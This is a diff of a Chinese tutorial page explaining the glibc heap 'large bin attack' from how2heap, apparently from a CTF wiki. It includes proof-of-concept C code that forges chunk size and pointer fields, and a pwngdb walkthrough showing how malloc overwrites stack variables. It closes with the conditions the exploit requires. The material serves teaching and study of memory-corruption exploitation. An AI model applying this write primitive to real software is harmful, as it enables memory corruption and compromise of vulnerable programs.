-<span class="p">|</span>         <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>
-<span class="p">|</span>         +------------+      <span class="p">|</span>     +------------+
-<span class="p">|</span>         <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>
-<span class="p">|</span>         <span class="p">|</span> size:0x410 <span class="p">|</span>      <span class="p">|</span>     <span class="p">|</span> size:0x290 <span class="p">|</span>
-<span class="p">|</span>         +------------+      <span class="p">|</span>     +------------+
-<span class="p">|</span>         <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>
-+-----------+   fd     <span class="p">|</span>      <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>
-          +------------+      <span class="p">|</span>     +------------+
-          <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>
-          <span class="p">|</span>            <span class="p">|</span>      +---------+ bk     <span class="p">|</span>
-          +------------+            +------------+
-</pre></div>
-
-<p>接着我们通过某种漏洞修改 P2 的 chunk：</p>
-<div class="codehilite"><pre><span></span>    <span class="n">p2</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3f1</span><span class="p">;</span>
+    <span class="n">p2</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3f1</span><span class="p">;</span>
     <span class="n">p2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="n">p2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="n">p2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
     <span class="n">p2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var2</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
+
+    <span class="c1">//------------------------------------</span>
+
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Let&#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span>
+                    <span class="s">&quot; During this time, targets should have already been rewritten:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;stack_var1 (%p): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var1</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">stack_var1</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;stack_var2 (%p): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var2</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">stack_var2</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </pre></div>
 
-<p>然后我们 malloc 一块新的chunk，此时，由于此时 fastbin 为空，程序遍历 unsorte bin，当时此时unsorte bin里的 chunk 为 large bin 的时候，首先判断当前的chunk size是不是小于bck-&gt;bk的size，也就是large bin里最小的chunk，如果是，直接添加到末尾。如果不是，就正向遍历large bin，直到找到一个chunk的size小于等于当前chunk size（large bin的chunk是从大到小正向排列的）。然后将当前的chunk插入到large bin的两个链表中。</p>
-<p>large bin chunk里的<code>fd_nextsize</code>指向的是链表中第一个比自己小的chunk，<code>bk_nextsize</code>指向第一个比自己大的chunk。</p>
-<p>而此时我们 largebin 只有一个chunk，且当前 当前 chunk size为 0x290 小于 largebin 里chunk 的大小，首先将unsorted bin 里的 chunk 置入 large bin，进而去遍历 large bin，此时发现 fwd chunk 不符合<code>if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))</code> 这个条件时：</p>
-<div class="codehilite"><pre><span></span>    <span class="p">[...]</span>
-
-              <span class="k">else</span>
-              <span class="p">{</span>
-                  <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
-                  <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
-                  <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-                  <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-              <span class="p">}</span>
-              <span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
-
-    <span class="p">[...]</span>
-
-    <span class="n">mark_bin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
-    <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
-    <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
-    <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-    <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+<p>编译完以后，注意！一定要用 glibc2.25 的 loader，改变 loader 的方法可以看这里：<a href="https://www.jianshu.com/p/1a966b62b3d4">https://www.jianshu.com/p/1a966b62b3d4</a></p>
+<p>pwngdb 走起，开始我们的分析之旅：</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack1.png" /></p>
+<p>先跳到这个语句：（比 how2heap 源文件多添加了一个 p4 变量）</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack2.png" /></p>
+<p>由于刚 free() 掉了两个 chunk。现在的 unsorted bin 有两个空闲的 chunk</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack3.png" /></p>
+<p>要注意的是：</p>
+<p>p1 的大小是 <code>0x330 &lt; 0x3f0</code> 大小属于 small bin，而 p2 的大小是 <code>0x410</code> 属于large bin</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack4.png" /> </p>
+<p>75 行做了很多事情，我来概述一下：</p>
+<ul>
+<li>从 unsorted bin 中拿出最后一个  chunk（p1 属于 small bin 的范围）</li>
+<li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li>
+<li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li>
+<li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li>
+<li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li>
+</ul>
+<p>也就是说，现在：</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack5.png" /></p>
+<p>unsorted bin 中有一个 chunk 大小是 <code>0x330 - 0xa0 = 0x290</code></p>
+<p>large bin 某一个序列的 bin 中有一个 chunk 大小是 <code>0x410</code></p>
+<p><strong>好我们继续调试</strong>：</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack6.png" /></p>
+<p>又 free 了一个大小为 0x410 的 large bin chunk。也就是说现在 unsorted bin 有两个空闲的 chunk，末尾是大小 <code>0x290</code> 大小的 chunk，第一个是 size 为 <code>0x410</code> 的 chunk。</p>
+<p>接着开始构造：</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack7.png" /></p>
+<p>修改 p2（large bin chunk），修改结果如下：</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack8.png" /></p>
+<p>再来看看<code>malloc(0x90)</code>做了什么：</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack9.png" /></p>
+<p>中间的过程概述一下，待会详细说重点：</p>
+<p>与第一次 <code>malloc(0x90)</code> 过程类似：</p>
+<ul>
+<li>从 unsorted bin 中拿出最后一个 chunk（size = 0x290），放入 small bin 中，标记该序列的 small bin 有空闲 chunk</li>
+<li>再从 unsorted bin 中拿出最后一个 chunk（size = 0x410）</li>
+</ul>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack10.png" /></p>
+<p><strong>重点来了：</strong></p>
+<p>由于这次拿的是属于 large bin chunk，进入了 else 分支：</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack11.png" /></p>
+<p>我们继续：</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack12.png" /></p>
+<p><strong>在一个序列的 large bin chunk 中 fd_nexesize 的方向是 size 变小的方向。这个循环的意思是找到一个比当前 fwd 指的 chunk 要大的地址，存入 fwd 中</strong>。</p>
+<p>由于当前 fwd 的 size 被我们修改过=<code>0x3f0</code>，所以没有进入循环。在这里就有一个漏洞的限制，放在后面说。</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack13.png" /></p>
+<p>这个原本的意思是把从 unsorted bin 中来的 chunk 插入这个序列中，但是这里没有检查合法性。这里存在这一个利用：</p>
+<p>之前做的构造，把 fwd 的 bk_nextsize 指向了另一个地址</p>
+<div class="codehilite"><pre><span></span><span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">nextsize</span>
+<span class="c1">// then</span>
+<span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
 </pre></div>
 
-<p>fwd 此时就为 P2 ， victim 就是 P3 ，此时就能将栈上的两个变量也被修改成了 <code>victim</code>。</p>
+<p>也就是：</p>
+<div class="codehilite"><pre><span></span><span class="n">addr2</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+<span class="c1">// 等价于</span>
+<span class="o">*</span><span class="p">(</span><span class="n">addr2</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</pre></div>
+
+<p>所以修改了 <code>stack_var2</code> 的值。</p>
+<p>接着还存着另外一个利用：</p>
+<p><img alt="" src="../figure/large_bin_attack/large_bin_attack14.png" /></p>
+<div class="codehilite"><pre><span></span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+<span class="c1">// 等价于</span>
+<span class="o">*</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</pre></div>
+
+<p>修改了 stack_var1 的值。</p>
+<p>至此利用完毕。由于最后分配的还是 small bin 中的 chunk，与 large bin 中的 chunk 也无关了。</p>
+<h2 id="large-bin-attack_2">总结  large bin attack 的利用方法<a class="headerlink" href="#large-bin-attack_2" title="Permanent link">&para;</a></h2>
+<p>how2heap 中也说了，large bin attack 是未来更深入的利用。现在我们来总结一下利用的条件：</p>
+<ul>
+<li>可以修改一个 large bin chunk 的 data</li>
+<li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li>
+</ul>
                 
                   
                 
